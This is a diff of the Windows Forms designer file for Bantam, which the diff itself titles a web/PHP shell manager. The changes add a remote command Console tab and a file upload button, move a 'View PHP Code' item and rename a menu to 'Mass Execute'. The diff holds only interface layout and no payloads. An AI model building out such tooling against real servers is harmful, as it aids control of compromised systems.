@@ -37,6 +37,7 @@
             this.phpToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.phpinfoToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.evalToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.viewPHPCodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.systemToolstripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.windowsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.windowsNetuserMenuItem = new System.Windows.Forms.ToolStripMenuItem();
@@ -101,6 +102,7 @@
             this.lblStaticCWD = new System.Windows.Forms.Label();
             this.lblDynCWD = new System.Windows.Forms.Label();
             this.tabPageFiles = new System.Windows.Forms.TabPage();
+            this.btnUpload = new System.Windows.Forms.Button();
             this.txtBoxFileBrowserPath = new bantam_php.GuiHelper.TextBoxButton();
             this.btnFileBrowserGo = new System.Windows.Forms.Button();
             this.btnFileBrowserRefresh = new System.Windows.Forms.Button();
@@ -113,7 +115,10 @@
             this.imageListFileBrowser = new System.Windows.Forms.ImageList(this.components);
             this.imageList1 = new System.Windows.Forms.ImageList(this.components);
             this.splitContainer1 = new System.Windows.Forms.SplitContainer();
-            this.viewPHPCodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.tabPageCmd = new System.Windows.Forms.TabPage();
+            this.richTextBoxConsoleOutput = new System.Windows.Forms.RichTextBox();
+            this.textBoxConsoleInput = new System.Windows.Forms.TextBox();
+            this.btnConsoleGoClick = new System.Windows.Forms.Button();
             shellColHeader = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.listviewClientsContextMenu.SuspendLayout();
             this.mainMenuStrip.SuspendLayout();
@@ -128,6 +133,7 @@
             this.splitContainer1.Panel1.SuspendLayout();
             this.splitContainer1.Panel2.SuspendLayout();
             this.splitContainer1.SuspendLayout();
+            this.tabPageCmd.SuspendLayout();
             this.SuspendLayout();
             // 
             // shellColHeader
@@ -151,7 +157,7 @@
             this.listViewClients.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
             this.listViewClients.MultiSelect = false;
             this.listViewClients.Name = "listViewClients";
-            this.listViewClients.Size = new System.Drawing.Size(507, 474);
+            this.listViewClients.Size = new System.Drawing.Size(506, 474);
             this.listViewClients.TabIndex = 0;
             this.listViewClients.UseCompatibleStateImageBehavior = false;
             this.listViewClients.View = System.Windows.Forms.View.Details;
@@ -174,7 +180,7 @@
             this.removeToolStripMenuItem,
             this.copyShellURLToolStripMenuItem});
             this.listviewClientsContextMenu.Name = "listViewContextMenuStrip";
-            this.listviewClientsContextMenu.Size = new System.Drawing.Size(191, 208);
+            this.listviewClientsContextMenu.Size = new System.Drawing.Size(191, 186);
             this.listviewClientsContextMenu.Paint += new System.Windows.Forms.PaintEventHandler(this.listviewClientsContextMenu_Paint);
             // 
             // phpToolStripMenuItem
@@ -192,7 +198,7 @@
             // 
             this.phpinfoToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("phpinfoToolStripMenuItem.Image")));
             this.phpinfoToolStripMenuItem.Name = "phpinfoToolStripMenuItem";
-            this.phpinfoToolStripMenuItem.Size = new System.Drawing.Size(184, 26);
+            this.phpinfoToolStripMenuItem.Size = new System.Drawing.Size(156, 22);
             this.phpinfoToolStripMenuItem.Text = "phpinfo";
             this.phpinfoToolStripMenuItem.Click += new System.EventHandler(this.phpinfoToolStripMenuItem_Click);
             // 
@@ -200,9 +206,16 @@
             // 
             this.evalToolStripMenuItem.Image = global::bantam.Properties.Resources.eval_16x16;
             this.evalToolStripMenuItem.Name = "evalToolStripMenuItem";
-            this.evalToolStripMenuItem.Size = new System.Drawing.Size(184, 26);
+            this.evalToolStripMenuItem.Size = new System.Drawing.Size(156, 22);
             this.evalToolStripMenuItem.Text = "eval";
             this.evalToolStripMenuItem.Click += new System.EventHandler(this.evalToolStripMenuItem_Click);
+            // 
+            // viewPHPCodeToolStripMenuItem
+            // 
+            this.viewPHPCodeToolStripMenuItem.Name = "viewPHPCodeToolStripMenuItem";
+            this.viewPHPCodeToolStripMenuItem.Size = new System.Drawing.Size(156, 22);
+            this.viewPHPCodeToolStripMenuItem.Text = "View PHP Code";
+            this.viewPHPCodeToolStripMenuItem.Click += new System.EventHandler(this.viewPHPCodeToolStripMenuItem_Click);
             // 
             // systemToolstripMenuItem
             // 
@@ -427,7 +440,7 @@
             this.massExecuteToolStripMenuItem});
             this.mainMenuStrip.Location = new System.Drawing.Point(0, 0);
             this.mainMenuStrip.Name = "mainMenuStrip";
-            this.mainMenuStrip.Size = new System.Drawing.Size(1091, 24);
+            this.mainMenuStrip.Size = new System.Drawing.Size(1090, 24);
             this.mainMenuStrip.TabIndex = 1;
             this.mainMenuStrip.Text = "menuStrip1";
             // 
@@ -447,19 +460,19 @@
             // addToolStripMenuItem
             // 
             this.addToolStripMenuItem.Name = "addToolStripMenuItem";
-            this.addToolStripMenuItem.Size = new System.Drawing.Size(131, 22);
+            this.addToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.addToolStripMenuItem.Text = "Add Shell";
             this.addToolStripMenuItem.Click += new System.EventHandler(this.addToolStripMenuItem_Click);
             // 
             // toolStripSeparator1
             // 
             this.toolStripSeparator1.Name = "toolStripSeparator1";
-            this.toolStripSeparator1.Size = new System.Drawing.Size(128, 6);
+            this.toolStripSeparator1.Size = new System.Drawing.Size(177, 6);
             // 
             // openToolStripMenuItem
             // 
             this.openToolStripMenuItem.Name = "openToolStripMenuItem";
-            this.openToolStripMenuItem.Size = new System.Drawing.Size(131, 22);
+            this.openToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.openToolStripMenuItem.Text = "Open...";
             this.openToolStripMenuItem.Click += new System.EventHandler(this.openToolStripMenuItem_Click);
             // 
@@ -467,14 +480,14 @@
             // 
             this.saveClientsToolStripMenuItem.Enabled = false;
             this.saveClientsToolStripMenuItem.Name = "saveClientsToolStripMenuItem";
-            this.saveClientsToolStripMenuItem.Size = new System.Drawing.Size(131, 22);
+            this.saveClientsToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.saveClientsToolStripMenuItem.Text = "Save";
             this.saveClientsToolStripMenuItem.Click += new System.EventHandler(this.saveClientsToolStripMenuItem_Click);
             // 
             // saveShellsAsToolStripMenuItem
             // 
             this.saveShellsAsToolStripMenuItem.Name = "saveShellsAsToolStripMenuItem";
-            this.saveShellsAsToolStripMenuItem.Size = new System.Drawing.Size(131, 22);
+            this.saveShellsAsToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
             this.saveShellsAsToolStripMenuItem.Text = "Save As...";
             this.saveShellsAsToolStripMenuItem.Click += new System.EventHandler(this.saveShellsAsToolStripMenuItem_Click);
             // 
@@ -515,15 +528,15 @@
             this.massExecuteToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.evalToolStripMenuItem1});
             this.massExecuteToolStripMenuItem.Name = "massExecuteToolStripMenuItem";
-            this.massExecuteToolStripMenuItem.Size = new System.Drawing.Size(71, 20);
-            this.massExecuteToolStripMenuItem.Text = "Functions";
+            this.massExecuteToolStripMenuItem.Size = new System.Drawing.Size(89, 20);
+            this.massExecuteToolStripMenuItem.Text = "Mass Execute";
             // 
             // evalToolStripMenuItem1
             // 
             this.evalToolStripMenuItem1.Image = global::bantam.Properties.Resources.eval_16x16;
             this.evalToolStripMenuItem1.Name = "evalToolStripMenuItem1";
             this.evalToolStripMenuItem1.Size = new System.Drawing.Size(184, 26);
-            this.evalToolStripMenuItem1.Text = "Mass Eval";
+            this.evalToolStripMenuItem1.Text = "Eval";
             this.evalToolStripMenuItem1.Click += new System.EventHandler(this.evalToolStripMenuItem1_Click);
             // 
             // tabControl1
@@ -533,6 +546,7 @@
             | System.Windows.Forms.AnchorStyles.Right)));
             this.tabControl1.Controls.Add(this.tabPageInfo);
             this.tabControl1.Controls.Add(this.tabPageFiles);
+            this.tabControl1.Controls.Add(this.tabPageCmd);
             this.tabControl1.Font = new System.Drawing.Font("Microsoft Tai Le", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.tabControl1.Location = new System.Drawing.Point(3, 4);
             this.tabControl1.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
@@ -586,10 +600,10 @@
             // lblStaticPHP
             // 
             this.lblStaticPHP.AutoSize = true;
-            this.lblStaticPHP.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.lblStaticPHP.Font = new System.Drawing.Font("Microsoft Tai Le", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.lblStaticPHP.Location = new System.Drawing.Point(23, 13);
             this.lblStaticPHP.Name = "lblStaticPHP";
-            this.lblStaticPHP.Size = new System.Drawing.Size(36, 13);
+            this.lblStaticPHP.Size = new System.Drawing.Size(32, 14);
             this.lblStaticPHP.TabIndex = 2;
             this.lblStaticPHP.Text = "PHP:";
             // 
@@ -605,10 +619,10 @@
             // lblStaticServerIP
             // 
             this.lblStaticServerIP.AutoSize = true;
-            this.lblStaticServerIP.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.lblStaticServerIP.Font = new System.Drawing.Font("Microsoft Tai Le", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.lblStaticServerIP.Location = new System.Drawing.Point(241, 13);
             this.lblStaticServerIP.Name = "lblStaticServerIP";
-            this.lblStaticServerIP.Size = new System.Drawing.Size(64, 13);
+            this.lblStaticServerIP.Size = new System.Drawing.Size(55, 14);
             this.lblStaticServerIP.TabIndex = 6;
             this.lblStaticServerIP.Text = "Server IP:";
             // 
@@ -638,10 +652,10 @@
             // lblStaticUname
             // 
             this.lblStaticUname.AutoSize = true;
-            this.lblStaticUname.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.lblStaticUname.Font = new System.Drawing.Font("Microsoft Tai Le", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.lblStaticUname.Location = new System.Drawing.Point(17, 13);
             this.lblStaticUname.Name = "lblStaticUname";
-            this.lblStaticUname.Size = new System.Drawing.Size(50, 13);
+            this.lblStaticUname.Size = new System.Drawing.Size(47, 14);
             this.lblStaticUname.TabIndex = 0;
             this.lblStaticUname.Text = "Uname:";
             // 
@@ -666,10 +680,10 @@
             // lblStaticUser
             // 
             this.lblStaticUser.AutoSize = true;
-            this.lblStaticUser.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.lblStaticUser.Font = new System.Drawing.Font("Microsoft Tai Le", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.lblStaticUser.Location = new System.Drawing.Point(28, 16);
             this.lblStaticUser.Name = "lblStaticUser";
-            this.lblStaticUser.Size = new System.Drawing.Size(37, 13);
+            this.lblStaticUser.Size = new System.Drawing.Size(33, 14);
             this.lblStaticUser.TabIndex = 1;
             this.lblStaticUser.Text = "User:";
             // 
@@ -685,10 +699,10 @@
             // lblStaticGroup
             // 
             this.lblStaticGroup.AutoSize = true;
-            this.lblStaticGroup.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.lblStaticGroup.Font = new System.Drawing.Font("Microsoft Tai Le", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.lblStaticGroup.Location = new System.Drawing.Point(248, 14);
             this.lblStaticGroup.Name = "lblStaticGroup";
-            this.lblStaticGroup.Size = new System.Drawing.Size(45, 13);
+            this.lblStaticGroup.Size = new System.Drawing.Size(43, 14);
             this.lblStaticGroup.TabIndex = 16;
             this.lblStaticGroup.Text = "Group:";
             // 
@@ -722,30 +736,30 @@
             // lblStaticWebServer
             // 
             this.lblStaticWebServer.AutoSize = true;
-            this.lblStaticWebServer.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.lblStaticWebServer.Font = new System.Drawing.Font("Microsoft Tai Le", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.lblStaticWebServer.Location = new System.Drawing.Point(11, 184);
             this.lblStaticWebServer.Name = "lblStaticWebServer";
-            this.lblStaticWebServer.Size = new System.Drawing.Size(78, 13);
+            this.lblStaticWebServer.Size = new System.Drawing.Size(69, 14);
             this.lblStaticWebServer.TabIndex = 7;
             this.lblStaticWebServer.Text = "Web Server:";
             // 
             // lblStaticFreeHDD
             // 
             this.lblStaticFreeHDD.AutoSize = true;
-            this.lblStaticFreeHDD.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.lblStaticFreeHDD.Font = new System.Drawing.Font("Microsoft Tai Le", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.lblStaticFreeHDD.Location = new System.Drawing.Point(248, 98);
             this.lblStaticFreeHDD.Name = "lblStaticFreeHDD";
-            this.lblStaticFreeHDD.Size = new System.Drawing.Size(76, 13);
+            this.lblStaticFreeHDD.Size = new System.Drawing.Size(65, 14);
             this.lblStaticFreeHDD.TabIndex = 4;
             this.lblStaticFreeHDD.Text = "Free Space:";
             // 
             // lblStaticHDD
             // 
             this.lblStaticHDD.AutoSize = true;
-            this.lblStaticHDD.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.lblStaticHDD.Font = new System.Drawing.Font("Microsoft Tai Le", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.lblStaticHDD.Location = new System.Drawing.Point(12, 98);
             this.lblStaticHDD.Name = "lblStaticHDD";
-            this.lblStaticHDD.Size = new System.Drawing.Size(78, 13);
+            this.lblStaticHDD.Size = new System.Drawing.Size(67, 14);
             this.lblStaticHDD.TabIndex = 3;
             this.lblStaticHDD.Text = "HDD Space:";
             // 
@@ -766,10 +780,10 @@
             // lblStaticCWD
             // 
             this.lblStaticCWD.AutoSize = true;
-            this.lblStaticCWD.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.lblStaticCWD.Font = new System.Drawing.Font("Microsoft Tai Le", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.lblStaticCWD.Location = new System.Drawing.Point(21, 13);
             this.lblStaticCWD.Name = "lblStaticCWD";
-            this.lblStaticCWD.Size = new System.Drawing.Size(40, 13);
+            this.lblStaticCWD.Size = new System.Drawing.Size(36, 14);
             this.lblStaticCWD.TabIndex = 5;
             this.lblStaticCWD.Text = "CWD:";
             // 
@@ -784,6 +798,7 @@
             // 
             // tabPageFiles
             // 
+            this.tabPageFiles.Controls.Add(this.btnUpload);
             this.tabPageFiles.Controls.Add(this.txtBoxFileBrowserPath);
             this.tabPageFiles.Controls.Add(this.btnFileBrowserGo);
             this.tabPageFiles.Controls.Add(this.btnFileBrowserRefresh);
@@ -798,24 +813,35 @@
             this.tabPageFiles.UseVisualStyleBackColor = true;
             this.tabPageFiles.Click += new System.EventHandler(this.tabPageFiles_Click);
             // 
+            // btnUpload
+            // 
+            this.btnUpload.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
+            this.btnUpload.Image = global::bantam.Properties.Resources.upload_1;
+            this.btnUpload.Location = new System.Drawing.Point(478, 11);
+            this.btnUpload.Name = "btnUpload";
+            this.btnUpload.Size = new System.Drawing.Size(23, 23);
+            this.btnUpload.TabIndex = 5;
+            this.btnUpload.UseVisualStyleBackColor = true;
+            this.btnUpload.Click += new System.EventHandler(this.btnUpload_Click);
+            // 
             // txtBoxFileBrowserPath
             // 
             this.txtBoxFileBrowserPath.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
             | System.Windows.Forms.AnchorStyles.Right)));
-            this.txtBoxFileBrowserPath.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.txtBoxFileBrowserPath.Font = new System.Drawing.Font("Microsoft Tai Le", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.txtBoxFileBrowserPath.Location = new System.Drawing.Point(6, 11);
             this.txtBoxFileBrowserPath.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
             this.txtBoxFileBrowserPath.Name = "txtBoxFileBrowserPath";
-            this.txtBoxFileBrowserPath.Size = new System.Drawing.Size(456, 21);
+            this.txtBoxFileBrowserPath.Size = new System.Drawing.Size(437, 23);
             this.txtBoxFileBrowserPath.TabIndex = 3;
             // 
             // btnFileBrowserGo
             // 
             this.btnFileBrowserGo.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
             this.btnFileBrowserGo.Image = global::bantam.Properties.Resources.play_2;
-            this.btnFileBrowserGo.Location = new System.Drawing.Point(468, 8);
+            this.btnFileBrowserGo.Location = new System.Drawing.Point(449, 11);
             this.btnFileBrowserGo.Name = "btnFileBrowserGo";
-            this.btnFileBrowserGo.Size = new System.Drawing.Size(28, 28);
+            this.btnFileBrowserGo.Size = new System.Drawing.Size(23, 23);
             this.btnFileBrowserGo.TabIndex = 4;
             this.btnFileBrowserGo.UseVisualStyleBackColor = true;
             this.btnFileBrowserGo.Click += new System.EventHandler(this.btnFileBrowserGo_Click);
@@ -825,10 +851,10 @@
             this.btnFileBrowserRefresh.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
             this.btnFileBrowserRefresh.Cursor = System.Windows.Forms.Cursors.Hand;
             this.btnFileBrowserRefresh.Image = global::bantam.Properties.Resources.home_png;
-            this.btnFileBrowserRefresh.Location = new System.Drawing.Point(502, 8);
+            this.btnFileBrowserRefresh.Location = new System.Drawing.Point(507, 11);
             this.btnFileBrowserRefresh.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
             this.btnFileBrowserRefresh.Name = "btnFileBrowserRefresh";
-            this.btnFileBrowserRefresh.Size = new System.Drawing.Size(28, 28);
+            this.btnFileBrowserRefresh.Size = new System.Drawing.Size(23, 23);
             this.btnFileBrowserRefresh.TabIndex = 1;
             this.btnFileBrowserRefresh.UseVisualStyleBackColor = true;
             this.btnFileBrowserRefresh.Click += new System.EventHandler(this.btnFileBrowserRefresh_Click);
@@ -839,7 +865,7 @@
             | System.Windows.Forms.AnchorStyles.Left) 
             | System.Windows.Forms.AnchorStyles.Right)));
             this.treeViewFileBrowser.ContextMenuStrip = this.contextMenuStripFileBrowser;
-            this.treeViewFileBrowser.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.treeViewFileBrowser.Font = new System.Drawing.Font("Microsoft Tai Le", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.treeViewFileBrowser.ImageIndex = 0;
             this.treeViewFileBrowser.ImageList = this.imageListFileBrowser;
             this.treeViewFileBrowser.Location = new System.Drawing.Point(6, 43);
@@ -926,22 +952,57 @@
             // splitContainer1.Panel2
             // 
             this.splitContainer1.Panel2.Controls.Add(this.tabControl1);
-            this.splitContainer1.Size = new System.Drawing.Size(1067, 483);
-            this.splitContainer1.SplitterDistance = 513;
+            this.splitContainer1.Size = new System.Drawing.Size(1066, 483);
+            this.splitContainer1.SplitterDistance = 512;
             this.splitContainer1.TabIndex = 3;
             // 
-            // viewPHPCodeToolStripMenuItem
+            // tabPageCmd
             // 
-            this.viewPHPCodeToolStripMenuItem.Name = "viewPHPCodeToolStripMenuItem";
-            this.viewPHPCodeToolStripMenuItem.Size = new System.Drawing.Size(184, 26);
-            this.viewPHPCodeToolStripMenuItem.Text = "View PHP Code";
-            this.viewPHPCodeToolStripMenuItem.Click += new System.EventHandler(this.viewPHPCodeToolStripMenuItem_Click);
+            this.tabPageCmd.Controls.Add(this.btnConsoleGoClick);
+            this.tabPageCmd.Controls.Add(this.textBoxConsoleInput);
+            this.tabPageCmd.Controls.Add(this.richTextBoxConsoleOutput);
+            this.tabPageCmd.Location = new System.Drawing.Point(4, 28);
+            this.tabPageCmd.Name = "tabPageCmd";
+            this.tabPageCmd.Padding = new System.Windows.Forms.Padding(3);
+            this.tabPageCmd.Size = new System.Drawing.Size(536, 442);
+            this.tabPageCmd.TabIndex = 2;
+            this.tabPageCmd.Text = "Console";
+            this.tabPageCmd.UseVisualStyleBackColor = true;
+            // 
+            // richTextBoxConsoleOutput
+            // 
+            this.richTextBoxConsoleOutput.Font = new System.Drawing.Font("Microsoft Tai Le", 9F);
+            this.richTextBoxConsoleOutput.Location = new System.Drawing.Point(6, 6);
+            this.richTextBoxConsoleOutput.Name = "richTextBoxConsoleOutput";
+            this.richTextBoxConsoleOutput.ReadOnly = true;
+            this.richTextBoxConsoleOutput.Size = new System.Drawing.Size(524, 400);
+            this.richTextBoxConsoleOutput.TabIndex = 0;
+            this.richTextBoxConsoleOutput.Text = "";
+            this.richTextBoxConsoleOutput.TextChanged += new System.EventHandler(this.richTextBoxConsoleOutput_TextChanged);
+            // 
+            // textBoxConsoleInput
+            // 
+            this.textBoxConsoleInput.Font = new System.Drawing.Font("Microsoft Tai Le", 9F);
+            this.textBoxConsoleInput.Location = new System.Drawing.Point(6, 412);
+            this.textBoxConsoleInput.Name = "textBoxConsoleInput";
+            this.textBoxConsoleInput.Size = new System.Drawing.Size(493, 23);
+            this.textBoxConsoleInput.TabIndex = 1;
+            // 
+            // btnConsoleGoClick
+            // 
+            this.btnConsoleGoClick.Image = global::bantam.Properties.Resources.play_2;
+            this.btnConsoleGoClick.Location = new System.Drawing.Point(505, 412);
+            this.btnConsoleGoClick.Name = "btnConsoleGoClick";
+            this.btnConsoleGoClick.Size = new System.Drawing.Size(23, 23);
+            this.btnConsoleGoClick.TabIndex = 2;
+            this.btnConsoleGoClick.UseVisualStyleBackColor = true;
+            this.btnConsoleGoClick.Click += new System.EventHandler(this.btnConsoleGoClick_Click);
             // 
             // BantamMain
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 14F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.ClientSize = new System.Drawing.Size(1091, 535);
+            this.ClientSize = new System.Drawing.Size(1090, 535);
             this.Controls.Add(this.splitContainer1);
             this.Controls.Add(this.mainMenuStrip);
             this.Font = new System.Drawing.Font("Microsoft Tai Le", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
@@ -952,7 +1013,7 @@
             this.MinimumSize = new System.Drawing.Size(752, 548);
             this.Name = "BantamMain";
             this.ShowIcon = false;
-            this.Text = "Bantam Web Shell Manager";
+            this.Text = "Bantam PHP Shell Manager";
             this.listviewClientsContextMenu.ResumeLayout(false);
             this.mainMenuStrip.ResumeLayout(false);
             this.mainMenuStrip.PerformLayout();
@@ -972,6 +1033,8 @@
             this.splitContainer1.Panel2.ResumeLayout(false);
             ((System.ComponentModel.ISupportInitialize)(this.splitContainer1)).EndInit();
             this.splitContainer1.ResumeLayout(false);
+            this.tabPageCmd.ResumeLayout(false);
+            this.tabPageCmd.PerformLayout();
             this.ResumeLayout(false);
             this.PerformLayout();
 
@@ -1062,6 +1125,11 @@
         private System.Windows.Forms.ToolStripMenuItem proxySettingsToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem copyShellURLToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem viewPHPCodeToolStripMenuItem;
+        private System.Windows.Forms.Button btnUpload;
+        private System.Windows.Forms.TabPage tabPageCmd;
+        private System.Windows.Forms.TextBox textBoxConsoleInput;
+        private System.Windows.Forms.RichTextBox richTextBoxConsoleOutput;
+        private System.Windows.Forms.Button btnConsoleGoClick;
     }
 }
 
